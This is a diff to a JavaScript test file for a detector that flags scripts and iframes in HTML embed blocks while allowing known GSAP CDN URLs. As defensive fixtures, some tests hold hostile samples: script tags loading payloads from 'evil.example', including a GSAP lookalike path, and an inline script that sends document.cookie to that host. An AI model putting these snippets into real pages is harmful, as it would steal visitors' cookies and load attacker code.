@@ -80,6 +80,24 @@ assert.deepEqual(sources(embed('broken w-embed', '<svg><div><video src="x"></vid
 // Wrappers are inert only around permitted content, not beside it (Codex P2).
 assert.deepEqual(sources(embed('overlay w-embed', '<svg></svg><div style="position:fixed;inset:0"></div>')), ['.overlay: <div>']);
 
+// srcdoc replaces the provider URL, so the iframe is custom markup (Codex P2).
+assert.deepEqual(sources(embed('vid w-embed', `<iframe src="https://www.youtube.com/embed/x" srcdoc="<video src='x.mp4'></video>"></iframe>`)), ['.vid: <iframe>']);
+
+// External scripts in embeds must load GSAP; anything else is custom code (Codex P2).
+assert.deepEqual(sources(embed('payload w-embed', '<script src="https://evil.example/payload.js"></script>')), ['.payload: <script src="https://evil.example/payload.js">']);
+assert.deepEqual(sources(embed('smooth w-embed', '<script src="https://unpkg.com/lenis@1.1.13/dist/lenis.min.js"></script>')), ['.smooth: <script src="https://unpkg.com/lenis@1.1.13/dist/lenis.min.js">'], 'Lenis is not a custom-code exception');
+assert.deepEqual(sources(embed('lookalike w-embed', '<script src="https://evil.example/npm/gsap/dist/gsap.min.js"></script>')), ['.lookalike: <script src="https://evil.example/npm/gsap/dist/gsap.min.js">']);
+assert.deepEqual(sources(embed('svgload w-embed', '<svg><script href="https://evil.example/x.js"></script></svg>')), ['.svgload: <script src="https://evil.example/x.js">']);
+for (const src of [
+  'https://cdn.jsdelivr.net/npm/gsap@3.13.0/dist/gsap.min.js',
+  'https://cdn.jsdelivr.net/npm/gsap@3.13.0/dist/ScrollTrigger.min.js',
+  'https://cdnjs.cloudflare.com/ajax/libs/gsap/3.12.5/gsap.min.js',
+  'https://unpkg.com/gsap@3/dist/gsap.min.js',
+  'https://cdn.prod.website-files.com/gsap/3.14.2/gsap.min.js'
+]) {
+  assert.deepEqual(sources(embed('gsap w-embed', `<script src="${src}"></script>`)), [], `GSAP source allowed: ${src}`);
+}
+
 // Attribute names are exact (Codex P2).
 assert.deepEqual(sources('<div data-class="w-embed"><video></video></div>'), []);
 assert.deepEqual(sources(embed('vid w-embed', '<iframe data-src="https://www.youtube.com/embed/x" src="https://evil.example/frame"></iframe>')), ['.vid: <iframe>']);
@@ -87,10 +105,10 @@ assert.deepEqual(sources(embed('vid w-embed', '<iframe data-src="https://www.you
 // Embed scripts are reported separately for consumers without the GSAP script checks (Codex P2).
 const scriptFindings = findHtmlEmbedScripts(
   embed('track w-embed', '<script>fetch("https://evil.example/" + document.cookie)</script>') +
-    embed('lib w-embed', '<script src="https://cdn.example/x.js"></script><svg></svg>') +
+    embed('lib w-embed', '<script src="https://cdn.jsdelivr.net/npm/gsap@3.13.0/dist/gsap.min.js"></script><svg></svg>') +
     embed('icon w-embed', '<svg></svg>')
 );
-assert.deepEqual(scriptFindings.map((finding) => finding.source), ['.track: inline script', '.lib: https://cdn.example/x.js']);
+assert.deepEqual(scriptFindings.map((finding) => finding.source), ['.track: inline script', '.lib: https://cdn.jsdelivr.net/npm/gsap@3.13.0/dist/gsap.min.js']);
 assert.deepEqual(
   findHtmlEmbedScripts(embed('icon w-embed', '<svg><script>fetch("https://evil.example/")</script><path d="M0"/></svg>')).map((finding) => finding.source),
   ['.icon: inline SVG script'],
